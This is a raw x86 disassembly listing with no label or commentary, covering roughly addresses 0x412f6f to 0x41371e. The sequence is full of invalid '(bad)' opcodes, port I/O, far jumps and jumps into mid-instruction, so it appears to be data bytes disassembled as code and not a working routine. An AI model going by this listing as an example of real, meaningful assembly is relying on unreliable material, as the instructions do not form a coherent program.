  412f6f:	dec    edi
  412f70:	add    bh,BYTE PTR [ebp+ebx*8-0x31e682c7]
  412f77:	mov    dh,0x70
  412f79:	leave  
  412f7a:	mov    al,ds:0xbfebaa5b
  412f7f:	sub    esi,DWORD PTR [edi-0xb]
  412f82:	cdq    
  412f83:	push   esp
  412f84:	pushw  es
  412f86:	ror    ebp,0x60
  412f89:	lods   eax,DWORD PTR ds:[esi]
  412f8a:	call   esp
  412f8c:	push   ss
  412f8d:	stos   BYTE PTR es:[edi],al
  412f8e:	in     al,dx
  412f8f:	or     BYTE PTR [edx+0x56],0x71
  412f93:	and    BYTE PTR [edi],bl
  412f95:	add    BYTE PTR [eax],0x40
  412f98:	or     bl,al
  412f9a:	out    0xe2,eax
  412f9c:	loope  0x412f3d
  412f9e:	dec    edx
  412f9f:	sbb    eax,0xcca1500
  412fa4:	mov    dh,0x1
  412fa6:	test   bl,0x95
  412fa9:	ds dec ebx
  412fac:	and    al,0xa0
  412fae:	cli    
  412faf:	out    0xa2,al
  412fb1:	mov    al,ds:0x76d35336
  412fb6:	das    
  412fb7:	mov    ebx,0x27ef1245
  412fbc:	test   BYTE PTR [ecx+0xf8bb19f],cl
  412fc2:	jg     0x41301a
  412fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fc5:	(bad)  
  412fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fc7:	lahf   
  412fc8:	cdq    
  412fc9:	adc    edx,DWORD PTR [eax+eax*1]
  412fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fcd:	push   ebp
  412fce:	jmp    0x412ff3
  412fd0:	les    ebx,FWORD PTR [ebx+0x4c]
  412fd3:	mov    eax,0xfed2938c
  412fd8:	mov    ecx,0x4b31f817
  412fdd:	and    al,bl
  412fdf:	cmc    
  412fe0:	aaa    
  412fe1:	div    DWORD PTR [esi-0xc07a746]
  412fe7:	adc    dh,cl
  412fe9:	shl    BYTE PTR [edi+0x5e],cl
  412fec:	jns    0x412ff1
  412fee:	dec    ebp
  412fef:	lods   eax,DWORD PTR ds:[esi]
  412ff0:	and    BYTE PTR [eax],al
  412ff2:	inc    ebp
  412ff3:	mov    ds:0xbea85d79,al
  412ff8:	mov    dh,0x6f
  412ffa:	jb     0x413043
  412ffc:	sub    al,0xbf
  412ffe:	and    eax,0x523557a4
  413003:	ss cmp bh,bl
  413006:	xor    al,0xc5
  413008:	xchg   ecx,eax
  413009:	push   cs
  41300a:	std    
  41300b:	retf   
  41300c:	inc    edx
  41300d:	sub    eax,0xefbae974
  413012:	sub    al,0x18
  413014:	or     DWORD PTR [eax],esi
  413016:	pushf  
  413017:	pusha  
  413018:	xor    DWORD PTR [esi+0x4ede4eec],0x325bb7a7
  413022:	or     ecx,ebp
  413024:	lea    ebp,[ebp+0x6fd9b4f6]
  41302a:	fld    st(2)
  41302c:	test   DWORD PTR [ebp+0x3b71869f],ebx
  413032:	mov    al,0xef
  413034:	sbb    ebx,DWORD PTR [ecx]
  413036:	les    ebp,FWORD PTR ds:[eax-0xe]
  41303a:	js     0x412fc3
  41303c:	or     ch,BYTE PTR [ebp+0x79]
  41303f:	sbb    DWORD PTR [ecx+0x4514ac51],ecx
  413045:	and    bl,BYTE PTR [ebp+0x0]
  413048:	popa   
  413049:	add    edx,DWORD PTR [ecx+esi*1+0x652a6d75]
  413050:	mov    DWORD PTR [edi+0x720a6708],esi
  413056:	addr16 in eax,0x4a
  413059:	jae    0x41302f
  41305b:	and    DWORD PTR [ecx-0x3019731f],edi
  413061:	cmp    al,0x73
  413063:	mov    ah,0xbf
  413065:	sbb    BYTE PTR [ecx],ch
  413067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413068:	add    BYTE PTR [edx],0xa3
  41306b:	xor    eax,0x78236a2a
  413070:	mov    dl,0x1f
  413072:	dec    ecx
  413073:	dec    ebp
  413074:	or     bl,BYTE PTR [eax+0x3e]
  413077:	(bad)  
  413078:	adc    esi,edx
  41307a:	add    esp,DWORD PTR [eax+0x5fc66ec1]
  413080:	fst    QWORD PTR [esi+esi*8+0x4d4e07e4]
  413087:	stc    
  413088:	lock push ss
  41308a:	jmp    0x4130da
  41308c:	xchg   edx,eax
  41308d:	adc    edi,DWORD PTR [eax+ebx*8-0x4b6922b5]
  413094:	jge    0x413096
  413096:	fwait
  413097:	and    DWORD PTR [bp+0x2a],0xf2b17c78
  41309f:	jle    0x4130af
  4130a1:	sahf   
  4130a2:	fidiv  DWORD PTR [ecx]
  4130a4:	sub    bh,BYTE PTR [edx+ecx*4+0x3d806723]
  4130ab:	xchg   esp,eax
  4130ac:	into   
  4130ad:	xor    ah,BYTE PTR [esp+eiz*4-0x5c5df3da]
  4130b4:	or     ah,BYTE PTR [esi+ebp*1]
  4130b7:	in     eax,dx
  4130b8:	sbb    DWORD PTR [esi],ebx
  4130ba:	(bad)  
  4130bb:	sub    ecx,DWORD PTR [esi]
  4130bd:	sub    esi,edi
  4130bf:	xlat   BYTE PTR ds:[ebx]
  4130c0:	xlat   BYTE PTR ds:[ebx]
  4130c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c2:	mov    cl,0x44
  4130c4:	jns    0x4130f0
  4130c6:	inc    eax
  4130c7:	fisub  DWORD PTR [eax-0x5be955b4]
  4130cd:	scas   al,BYTE PTR es:[edi]
  4130ce:	push   ebx
  4130cf:	jns    0x413077
  4130d1:	(bad)  
  4130d2:	addr16 mov eax,gs:0x49cf
  4130d7:	mov    dl,0x72
  4130d9:	or     eax,0xc2663b89
  4130de:	addr16 sbb al,0xca
  4130e1:	cmp    al,0x30
  4130e3:	imul   BYTE PTR [esi+0x10508b97]
  4130e9:	in     al,dx
  4130ea:	push   ebp
  4130eb:	pop    edi
  4130ec:	inc    esp
  4130ed:	jmp    0x1ee39c25
  4130f2:	aam    0xad
  4130f4:	ins    DWORD PTR es:[edi],dx
  4130f5:	fist   WORD PTR [edx+0x3a]
  4130f8:	cwde   
  4130f9:	ins    DWORD PTR es:[edi],dx
  4130fa:	mov    BYTE PTR [eax+0x7e680b35],0x8f
  413101:	(bad)  
  413102:	mov    edi,0x285c2be5
  413107:	mov    ch,0x3f
  413109:	xchg   edi,eax
  41310a:	dec    edx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	sbb    DWORD PTR [edx+0x67],ebp
  41310f:	mov    ds:0xe9999e83,eax
  413114:	jne    0x413194
  413116:	jl     0x413191
  413118:	jo     0x4130f6
  41311a:	shl    BYTE PTR [ebx+0x1c332c30],1
  413120:	fiadd  WORD PTR [ebx-0x7a]
  413123:	iret   
  413124:	and    DWORD PTR ds:0xbe342cc6,esi
  41312a:	push   ebx
  41312b:	sbb    al,0x91
  41312d:	loope  0x413193
  41312f:	data16 addr16 jns 0x4130db
  413133:	push   esi
  413134:	cmc    
  413135:	out    dx,eax
  413136:	add    ah,BYTE PTR [esi+0x2d8cdd44]
  41313c:	icebp  
  41313d:	cld    
  41313e:	xor    eax,esi
  413140:	stos   DWORD PTR es:[edi],eax
  413141:	(bad)  
  413142:	pop    ds
  413143:	mov    cl,0xd9
  413145:	test   BYTE PTR [ebp+0x60],ah
  413148:	add    eax,0xd6ab9a0c
  41314d:	sbb    ch,BYTE PTR [edi+0x5d03eef5]
  413153:	push   cs
  413154:	push   eax
  413155:	push   0xffffffde
  413157:	mov    esi,0x591aa473
  41315c:	lods   al,BYTE PTR ds:[esi]
  41315d:	adc    BYTE PTR [edi-0x40],ch
  413160:	xor    BYTE PTR [edx+0x379ad579],0xbd
  413167:	dec    edi
  413168:	dec    edi
  413169:	add    BYTE PTR [ecx+0x8],ah
  41316c:	lods   al,BYTE PTR ds:[esi]
  41316d:	cmc    
  41316e:	aad    0x65
  413170:	dec    edi
  413171:	pop    es
  413172:	int    0x81
  413174:	fnstenv [ecx-0x3c8fa76b]
  41317a:	cmp    bh,BYTE PTR [ecx+0x21b4d6a7]
  413180:	inc    edi
  413181:	retf   0xdd0e
  413184:	or     DWORD PTR [edi],ebx
  413186:	push   esp
  413187:	aas    
  413188:	dec    ebp
  413189:	adc    bh,BYTE PTR [ebx+0x457c08c0]
  41318f:	xchg   ebp,eax
  413190:	psrlq  mm3,mm6
  413193:	fcom   DWORD PTR [eax]
  413195:	pop    esp
  413196:	xor    BYTE PTR [eax+0x70372dc1],bh
  41319c:	adc    esp,ebx
  41319e:	mov    DWORD PTR [ebx+0x33],0x32888f71
  4131a5:	xchg   esp,eax
  4131a6:	std    
  4131a7:	pop    esi
  4131a8:	dec    ecx
  4131a9:	or     ebx,DWORD PTR [eax+ebp*4]
  4131ac:	sbb    al,0xaa
  4131ae:	xchg   esp,eax
  4131af:	iret   
  4131b0:	clc    
  4131b1:	sub    al,0x26
  4131b3:	or     BYTE PTR [ebp-0x35cd3c2c],dh
  4131b9:	xor    al,0x50
  4131bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131bc:	mov    dh,BYTE PTR [edi]
  4131be:	sub    DWORD PTR [ebx+0x6d7f74d],0x28
  4131c5:	rcl    DWORD PTR [eax-0x12be4a9c],cl
  4131cb:	or     eax,0x71d53912
  4131d0:	jmp    0xfae3:0xaff8f798
  4131d7:	xor    BYTE PTR ds:[eax],ch
  4131da:	aas    
  4131db:	mov    DWORD PTR [eax-0x80],esi
  4131de:	jg     0x413201
  4131e0:	cmp    BYTE PTR [ecx+eiz*4+0x54],al
  4131e4:	mov    dl,0xb3
  4131e6:	in     eax,dx
  4131e7:	push   eax
  4131e8:	add    ecx,esi
  4131ea:	push   esi
  4131eb:	stos   DWORD PTR es:[edi],eax
  4131ec:	xchg   ebx,eax
  4131ed:	adc    al,0x8c
  4131ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131f0:	pop    ecx
  4131f1:	xchg   BYTE PTR [ebp-0x11eb75f2],dl
  4131f7:	xchg   edi,eax
  4131f8:	ja     0x413186
  4131fa:	into   
  4131fb:	mov    BYTE PTR [ebx-0x207ff341],dh
  413201:	xor    ebx,DWORD PTR [ebx-0x7c]
  413204:	mov    ds:0x6d1b823b,eax
  413209:	lods   eax,DWORD PTR ds:[esi]
  41320a:	inc    ecx
  41320b:	hlt    
  41320c:	mov    ebp,0x6f3b34c0
  413211:	sub    edx,DWORD PTR [ecx+0x882174b]
  413217:	pop    ebx
  413218:	fs mov dh,dl
  41321b:	or     BYTE PTR [edi],dl
  41321d:	mov    edx,0x1a5c0b3c
  413222:	add    BYTE PTR [edx],0x42
  413225:	and    al,0xcc
  413227:	xor    eax,DWORD PTR [ebp+0x51]
  41322a:	pushf  
  41322b:	and    eax,0x358d441b
  413230:	xor    eax,0x41a14f22
  413235:	cmp    ebp,DWORD PTR [ecx+edx*8+0x7cb98e60]
  41323c:	daa    
  41323d:	out    0xf3,eax
  41323f:	ja     0x413258
  413241:	retf   0x29
  413244:	add    ah,BYTE PTR [edx]
  413246:	fldcw  WORD PTR [ebx+0x38]
  413249:	xor    dx,WORD PTR [esi+0x7058ce78]
  413250:	lds    ebx,FWORD PTR [edx]
  413252:	jmp    0xc2de:0x79c6b691
  413259:	in     eax,0xb
  41325b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41325c:	push   cs
  41325d:	sahf   
  41325e:	xor    eax,0x3d306075
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	mov    cl,bh
  413266:	out    0xf8,eax
  413268:	pop    eax
  413269:	retf   0x774d
  41326c:	retf   0xcf71
  41326f:	test   edi,eax
  413271:	dec    esi
  413272:	jne    0x4132b9
  413274:	add    al,0x0
  413276:	outs   dx,DWORD PTR ds:[esi]
  413277:	pop    esp
  413278:	pop    ebp
  413279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41327a:	and    ecx,0xfffffff8
  41327d:	ret    0x4f3a
  413280:	xor    eax,0x4021ce52
  413285:	(bad)  
  413287:	push   0xeeb57ca3
  41328c:	repz (bad) 
  41328f:	lahf   
  413290:	pop    ecx
  413291:	fidiv  WORD PTR [edx+0x2742b63d]
  413297:	mov    dl,0xc9
  413299:	push   ss
  41329a:	xchg   ch,dl
  41329c:	ins    BYTE PTR es:[edi],dx
  41329d:	dec    eax
  41329e:	cs icebp 
  4132a0:	lahf   
  4132a1:	into   
  4132a2:	add    DWORD PTR [eax],ebp
  4132a4:	dec    ebp
  4132a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132a6:	cwde   
  4132a7:	pop    edx
  4132a8:	in     al,dx
  4132a9:	xor    bh,BYTE PTR [eax+ecx*4-0x4bc9f5d]
  4132b0:	(bad)  
  4132b1:	push   edx
  4132b2:	lock cmp edi,edi
  4132b5:	or     al,0xf
  4132b7:	(bad)  
  4132b8:	adc    cl,BYTE PTR cs:[edi+ebp*8+0x7498fac1]
  4132c0:	or     ah,BYTE PTR [edx-0x33282a88]
  4132c6:	lods   al,BYTE PTR ds:[esi]
  4132c7:	scas   eax,DWORD PTR es:[edi]
  4132c8:	ins    DWORD PTR es:[edi],dx
  4132c9:	mov    eax,0xa524bd34
  4132cf:	add    DWORD PTR [eax+0x78],edi
  4132d2:	adc    DWORD PTR [edi+0x33],0xffffffe7
  4132d6:	sahf   
  4132d7:	mov    WORD PTR [ecx],?
  4132d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132da:	lods   al,BYTE PTR ds:[esi]
  4132db:	mov    ebx,esi
  4132dd:	cmp    eax,0xeb97a239
  4132e2:	push   edx
  4132e3:	cmp    esi,esi
  4132e5:	sbb    cl,BYTE PTR [ecx]
  4132e7:	xadd   DWORD PTR [edx],edi
  4132ea:	mov    ds:0x143a2fc,al
  4132ef:	mov    cl,0x80
  4132f1:	push   ecx
  4132f2:	jno    0x413311
  4132f4:	inc    esi
  4132f5:	cld    
  4132f6:	xchg   BYTE PTR [ebx],ch
  4132f8:	jmp    0xcd6fd966
  4132fd:	repnz mov dh,0xf4
  413300:	mov    edx,0x66a715e3
  413305:	popa   
  413306:	ja     0x413357
  413308:	add    BYTE PTR [eax],cl
  41330a:	imul   ebp,esp,0xffffffbf
  41330d:	sbb    bh,BYTE PTR ds:[eax]
  413310:	inc    ebp
  413311:	test   al,0xa9
  413313:	push   ds
  413314:	mov    ebx,0xb8ba4eb5
  413319:	push   0xffffffbc
  41331b:	xchg   esp,eax
  41331c:	out    dx,eax
  41331d:	xor    DWORD PTR [esi-0x2b],esi
  413320:	mov    bh,0x1a
  413322:	pop    ss
  413323:	repnz mov bh,0x85
  413326:	clc    
  413327:	outs   dx,BYTE PTR ds:[esi]
  413328:	in     al,0x30
  41332a:	cmp    esi,DWORD PTR [edx]
  41332c:	scas   al,BYTE PTR es:[edi]
  41332d:	adc    edi,esi
  41332f:	icebp  
  413330:	xchg   ecx,eax
  413331:	sub    edi,DWORD PTR [edi+0x2d3cb0ed]
  413337:	push   ss
  413338:	or     edi,esp
  41333a:	stos   DWORD PTR es:[edi],eax
  41333b:	outs   dx,BYTE PTR ds:[esi]
  41333c:	es test bh,bh
  41333f:	cmp    eax,0x77884a17
  413344:	popf   
  413345:	inc    ecx
  413346:	inc    edi
  413347:	or     BYTE PTR [ebp-0x54d4e116],dl
  41334d:	call   0xf1383e45
  413352:	jmp    0x4133c5
  413354:	push   ebp
  413355:	shr    BYTE PTR [edx],1
  413357:	mov    ebp,0x7c077708
  41335c:	sub    bl,BYTE PTR [edi+0x75ae28fa]
  413362:	mov    esi,DWORD PTR [ebx+0x616d8661]
  413368:	lahf   
  413369:	sbb    BYTE PTR [edx],dl
  41336b:	retf   
  41336c:	or     cl,BYTE PTR [edi]
  41336e:	ret    
  41336f:	sub    esp,DWORD PTR [ecx+0x1cb6ed1b]
  413375:	mov    cl,BYTE PTR [edi+0x1d]
  413378:	cmp    BYTE PTR [ebx-0x1e],0x11
  41337c:	adc    BYTE PTR [edx+0x45cf05b1],ch
  413382:	aas    
  413383:	xchg   ecx,eax
  413384:	test   BYTE PTR [esi],bh
  413386:	inc    ebp
  413387:	sub    BYTE PTR [edx+0x6c],bl
  41338a:	int    0x6e
  41338c:	es (bad) 
  41338f:	div    DWORD PTR [edx-0x4955b40d]
  413395:	push   cs
  413396:	ss adc al,bh
  413399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41339a:	into   
  41339b:	sbb    al,0xdc
  41339d:	xchg   bl,dl
  41339f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a0:	mov    bh,0xcf
  4133a2:	jbe    0x413343
  4133a4:	fadd   DWORD PTR [edi]
  4133a6:	pop    ss
  4133a7:	push   esi
  4133a8:	push   ebp
  4133a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133aa:	ret    0x41a
  4133ad:	mov    al,0x3a
  4133af:	cdq    
  4133b0:	pop    ds
  4133b1:	test   eax,0x32a425ae
  4133b6:	pop    esp
  4133b7:	inc    ecx
  4133b8:	dec    ebp
  4133b9:	ficomp DWORD PTR ds:[ecx-0x3afd4cff]
  4133c0:	sbb    al,0xb0
  4133c2:	cmp    DWORD PTR [esp+ebx*2+0x4d],ecx
  4133c6:	fs call 0x5c1d:0x3fcbe7e0
  4133ce:	fwait
  4133cf:	xchg   BYTE PTR [esi],al
  4133d1:	sub    ah,BYTE PTR [edi]
  4133d3:	test   BYTE PTR [eax-0x77],dl
  4133d6:	iret   
  4133d7:	push   ecx
  4133d8:	call   0x28191b0e
  4133dd:	out    dx,eax
  4133de:	pop    ebp
  4133df:	ds cwde 
  4133e1:	pop    esi
  4133e2:	in     al,0x5e
  4133e4:	ror    DWORD PTR ds:0xc20ed1c1,0x8e
  4133eb:	test   eax,0xcadb82af
  4133f0:	inc    BYTE PTR [edi]
  4133f2:	int3   
  4133f3:	inc    esi
  4133f4:	mov    al,ds:0x476e294f
  4133f9:	fcomip st,st(2)
  4133fb:	dec    esi
  4133fc:	retf   0x1a8a
  4133ff:	fisub  WORD PTR [edx]
  413401:	mov    cl,0x97
  413403:	cli    
  413404:	xchg   ecx,eax
  413405:	adc    eax,0x30c95b92
  41340a:	sbb    esi,DWORD PTR ds:0x25fa7f
  413410:	add    BYTE PTR [esi-0x2fecaf27],bh
  413416:	cmp    al,BYTE PTR [ecx+0x76e3f2b2]
  41341c:	push   es
  41341d:	fldenv [edx+0x221ecc90]
  413423:	xchg   ebp,eax
  413424:	scas   al,BYTE PTR es:[edi]
  413425:	xchg   esi,eax
  413426:	xchg   edx,eax
  413427:	adc    cl,BYTE PTR [edx-0x23]
  41342a:	ds stos BYTE PTR es:[edi],al
  41342c:	popa   
  41342d:	push   eax
  41342e:	push   esi
  41342f:	fs xchg ebx,eax
  413431:	jl     0x4133cd
  413433:	lods   al,BYTE PTR ds:[esi]
  413434:	in     eax,0xd7
  413436:	clc    
  413437:	push   ebp
  413438:	out    0x39,al
  41343a:	(bad)  
  41343b:	div    DWORD PTR [edi-0x74]
  41343e:	sbb    eax,0xdd9b8bfa
  413443:	cmp    esi,DWORD PTR fs:[ebp-0x63724983]
  41344a:	fild   QWORD PTR [edi]
  41344c:	test   eax,0xf03738b4
  413451:	rcl    DWORD PTR [ebp+0x60],0xe2
  413455:	push   0xffffff86
  413457:	push   ds
  413458:	or     BYTE PTR [esi+0x6726b0d6],bl
  41345e:	sub    eax,0x2126b5aa
  413463:	ret    
  413464:	in     eax,dx
  413465:	dec    BYTE PTR [ebp+0x6a]
  413468:	outs   dx,DWORD PTR ds:[esi]
  413469:	es test eax,0x6a01e77
  41346f:	xor    ah,BYTE PTR [ebx+0x2]
  413472:	mov    al,0x1f
  413474:	and    BYTE PTR [ebx],0xfe
  413477:	add    DWORD PTR [ecx+0x2fa75c3a],esp
  41347d:	mov    ebp,0xd0ec109d
  413482:	fcom   QWORD PTR ss:[esi-0x22c4a285]
  413489:	mov    edx,0xf5594703
  41348e:	sti    
  41348f:	(bad)  
  413490:	(bad)  
  413491:	js     0x413510
  413493:	jae    0x413429
  413495:	cli    
  413496:	push   cs
  413497:	sar    DWORD PTR [edi-0x77f2b8c9],0x7e
  41349e:	mov    ebx,0xd05059a2
  4134a3:	cmp    al,0x6c
  4134a5:	inc    esi
  4134a6:	in     eax,dx
  4134a7:	(bad)  
  4134a8:	ins    DWORD PTR es:[edi],dx
  4134a9:	aas    
  4134aa:	int3   
  4134ab:	jle    0x413458
  4134ad:	aam    0x46
  4134af:	sbb    eax,0x655f6f02
  4134b4:	arpl   ax,bx
  4134b6:	outs   dx,BYTE PTR ds:[esi]
  4134b7:	mov    dl,0xca
  4134b9:	ins    DWORD PTR es:[edi],dx
  4134ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134bb:	(bad)  
  4134bc:	das    
  4134bd:	xor    esp,DWORD PTR [ecx+0x60]
  4134c0:	pop    ss
  4134c1:	dec    ebx
  4134c2:	push   ebx
  4134c3:	pop    edx
  4134c4:	xor    BYTE PTR [ebx+0x24],ch
  4134c7:	(bad)  
  4134c8:	xor    ah,BYTE PTR [edx]
  4134ca:	repz int3 
  4134cc:	pop    esi
  4134cd:	popf   
  4134ce:	xchg   ebx,eax
  4134cf:	push   eax
  4134d0:	mov    ecx,0x8d10325e
  4134d5:	and    ebp,eax
  4134d7:	stc    
  4134d8:	dec    ebx
  4134d9:	sub    BYTE PTR [ebx+0x26e312db],bh
  4134df:	push   ecx
  4134e0:	dec    ecx
  4134e1:	mov    DWORD PTR [eax],0x77afd739
  4134e7:	jne    0x4134ec
  4134e9:	dec    esp
  4134ea:	push   ss
  4134eb:	outs   dx,BYTE PTR ds:[esi]
  4134ec:	fcomp  QWORD PTR [edx+0x79]
  4134ef:	imul   esp,DWORD PTR [edx+0x79e8d36b],0xffffffd4
  4134f6:	(bad)  
  4134f7:	cmc    
  4134f8:	add    eax,DWORD PTR [edi+0x15]
  4134fb:	mov    ch,0x9c
  4134fd:	push   cs
  4134fe:	push   0x4446fb4d
  413503:	repz call 0x5b7ac2a7
  413509:	mov    esp,0x27ef0ca9
  41350e:	cld    
  41350f:	mov    DWORD PTR [esp+eax*8-0x15],ebp
  413513:	mov    edx,0x923e051f
  413518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413519:	dec    edi
  41351a:	das    
  41351b:	mov    eax,ds:0xb0e50bca
  413520:	adc    BYTE PTR [ebp-0x4],bh
  413523:	loope  0x41358e
  413525:	cwde   
  413526:	mov    ecx,ecx
  413528:	add    BYTE PTR [esi],bl
  41352a:	push   ebp
  41352b:	or     edx,DWORD PTR cs:[ebp-0x66b45e68]
  413532:	mov    BYTE PTR [ebx],dl
  413534:	fld    TBYTE PTR [eax+0x255f62f9]
  41353a:	xlat   BYTE PTR ds:[ebx]
  41353b:	aaa    
  41353c:	daa    
  41353d:	push   esi
  41353e:	loope  0x4134c4
  413540:	and    ah,BYTE PTR [esi+0x6aaee573]
  413546:	js     0x4134dd
  413548:	jae    0x413593
  41354a:	shr    BYTE PTR [eax],cl
  41354c:	mov    BYTE PTR [esi+0x60],0xa1
  413550:	sub    eax,edi
  413552:	in     al,0x88
  413554:	imul   esp,DWORD PTR [edi+ebp*1+0x51477da3],0x8c075058
  41355f:	out    dx,al
  413560:	cmp    ch,0x72
  413563:	jae    0x413598
  413565:	push   edi
  413566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413567:	xor    DWORD PTR [edx+0x2c92db08],eax
  41356d:	adc    ebp,edx
  41356f:	mov    dl,0x90
  413571:	sahf   
  413572:	xor    al,0xea
  413574:	ss popf 
  413576:	add    cl,BYTE PTR [ecx+0x28]
  413579:	sbb    DWORD PTR [edx+0x52],0x25676e8b
  413580:	les    edx,FWORD PTR [edi]
  413582:	sub    DWORD PTR [esi],ebp
  413584:	pop    ecx
  413585:	xor    bl,BYTE PTR [esi]
  413587:	mov    edi,0x8b9f8b82
  41358c:	std    
  41358d:	cmp    DWORD PTR [ecx+0x46df4a85],eax
  413593:	repz int3 
  413595:	jo     0x413561
  413597:	cdq    
  413598:	out    0x3b,al
  41359a:	cmc    
  41359b:	int3   
  41359c:	mov    ds:0xaabc3eb9,eax
  4135a1:	mov    bh,0x49
  4135a3:	frstor [ebx+0x3e4bac6e]
  4135a9:	test   BYTE PTR [esi],bl
  4135ab:	mov    edi,0x749f70a2
  4135b0:	enter  0xdbdb,0xac
  4135b4:	push   ebx
  4135b5:	lea    ebx,[edx+0x6167df4d]
  4135bb:	push   0x87a394dd
  4135c0:	pushf  
  4135c1:	std    
  4135c2:	mov    edi,0xa4207cc7
  4135c7:	lock pushf 
  4135c9:	mov    ebx,0x444485cf
  4135ce:	or     ch,BYTE PTR [ebx-0x50]
  4135d1:	aas    
  4135d2:	inc    edi
  4135d3:	add    ebp,DWORD PTR [eax+0x688c7b5d]
  4135d9:	rcl    DWORD PTR [esp+edi*2-0x2fd6799],1
  4135e0:	xor    al,0xb7
  4135e2:	out    dx,eax
  4135e3:	jp     0x4135f0
  4135e5:	aaa    
  4135e6:	lods   al,BYTE PTR ds:[esi]
  4135e7:	xchg   edx,eax
  4135e8:	cmp    dh,BYTE PTR [eax]
  4135ea:	mov    ch,0x1f
  4135ec:	iret   
  4135ed:	xchg   dh,cl
  4135ef:	scas   eax,DWORD PTR es:[edi]
  4135f0:	out    dx,al
  4135f1:	and    eax,0x5bbd0205
  4135f6:	mov    cl,0x4c
  4135f8:	loopne 0x4135c0
  4135fa:	push   edi
  4135fb:	mov    eax,ds:0x9f168685
  413600:	adc    DWORD PTR [eax-0x76],ebx
  413603:	lahf   
  413604:	xchg   edx,eax
  413605:	cmp    esp,0xfffffffc
  413608:	sahf   
  413609:	fistp  WORD PTR [ebx]
  41360b:	mov    bh,0xba
  41360d:	mov    esi,0x13da5e94
  413612:	xchg   ebx,eax
  413613:	in     eax,0xb8
  413615:	int    0x9
  413617:	mov    bl,ah
  413619:	or     DWORD PTR [ebp-0x6c91afc1],ecx
  41361f:	and    eax,DWORD PTR [ecx+0x2b5993c6]
  413625:	jne    0x4135e6
  413627:	add    eax,0x413859e4
  41362c:	call   0xea92:0x7012e439
  413633:	mov    ecx,0x49730972
  413638:	leave  
  413639:	mov    cl,ch
  41363b:	imul   edx,DWORD PTR [eax-0x68],0x86614099
  413642:	mov    esi,0x37a02fb0
  413647:	sahf   
  413648:	js     0x4135d2
  41364a:	shr    esp,0xa0
  41364d:	push   0xffffffd6
  41364f:	(bad)  
  413651:	(bad)  
  413652:	cmp    BYTE PTR [edx],dh
  413654:	test   BYTE PTR [esi],ch
  413656:	push   eax
  413657:	sub    BYTE PTR [edi+0x6],dl
  41365a:	bound  ecx,QWORD PTR [eax+0x7e]
  41365d:	daa    
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	mov    al,0xaf
  413661:	or     ah,0x34
  413664:	fs jns 0x413691
  413667:	sahf   
  413668:	repz mov al,BYTE PTR [ebx]
  41366b:	sbb    DWORD PTR [edi],esi
  41366d:	stos   BYTE PTR es:[edi],al
  41366e:	jb     0x4136c4
  413670:	pop    ecx
  413671:	mov    ecx,0x94198689
  413676:	pop    edx
  413677:	dec    ebp
  413678:	jle    0x41362c
  41367a:	ret    
  41367b:	pop    si
  41367d:	jmp    0x41366e
  41367f:	pop    edx
  413680:	dec    eax
  413681:	xor    cl,BYTE PTR [ebx+0x7b0c5615]
  413687:	mov    bl,0x61
  413689:	cmp    bl,BYTE PTR cs:[ebx]
  41368c:	add    al,0x1
  41368e:	jno    0x413680
  413690:	push   esi
  413691:	push   edx
  413692:	(bad)  
  413693:	mov    ds:0x9ce9f735,eax
  413698:	push   ss
  413699:	sub    DWORD PTR [eax-0x73],esi
  41369c:	pusha  
  41369d:	int3   
  41369e:	loopne 0x4136bc
  4136a0:	jns    0x413683
  4136a2:	inc    eax
  4136a3:	push   esp
  4136a4:	aas    
  4136a5:	test   DWORD PTR ds:0xb3b1788,edx
  4136ab:	xor    al,al
  4136ad:	cmp    al,dl
  4136af:	push   eax
  4136b0:	js     0x413691
  4136b2:	fwait
  4136b3:	xor    edx,DWORD PTR [edx+0xba5183c]
  4136b9:	sub    edx,DWORD PTR [ecx+0x75]
  4136bc:	add    eax,ecx
  4136be:	ins    DWORD PTR es:[edi],dx
  4136bf:	sahf   
  4136c0:	ins    DWORD PTR es:[edi],dx
  4136c1:	outs   dx,BYTE PTR ds:[esi]
  4136c2:	clc    
  4136c3:	xchg   DWORD PTR [ebp-0x21],ebp
  4136c6:	mov    esp,0x366099c6
  4136cb:	jmp    0x49dd:0x470008b7
  4136d2:	or     al,0x44
  4136d4:	cdq    
  4136d5:	ficom  WORD PTR [ecx]
  4136d7:	dec    eax
  4136d8:	int3   
  4136d9:	repnz push 0xffffffec
  4136dc:	mov    al,ds:0x87d6560c
  4136e1:	inc    eax
  4136e2:	or     DWORD PTR [edx],eax
  4136e4:	shl    DWORD PTR [eax+0x6fd90eb7],1
  4136ea:	outs   dx,BYTE PTR ds:[esi]
  4136eb:	imul   ecx,DWORD PTR [eax+edi*8],0x63
  4136ef:	cmp    edi,eax
  4136f1:	or     eax,0x57b6c272
  4136f6:	mov    esp,0xc07256f8
  4136fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136fc:	pop    ebx
  4136fd:	inc    esp
  4136fe:	leave  
  4136ff:	mov    eax,0x8f85c016
  413704:	pushf  
  413705:	xchg   ebx,eax
  413706:	gs addr16 cs pop es
  41370a:	fisttp DWORD PTR [eax]
  41370c:	mov    edx,0x8ce6e230
  413711:	pop    es
  413712:	aas    
  413713:	sub    eax,0x809d6b68
  413718:	les    eax,FWORD PTR [edx]
  41371a:	icebp  
  41371b:	or     bl,bh
  41371d:	push   edx
  41371e:	nop
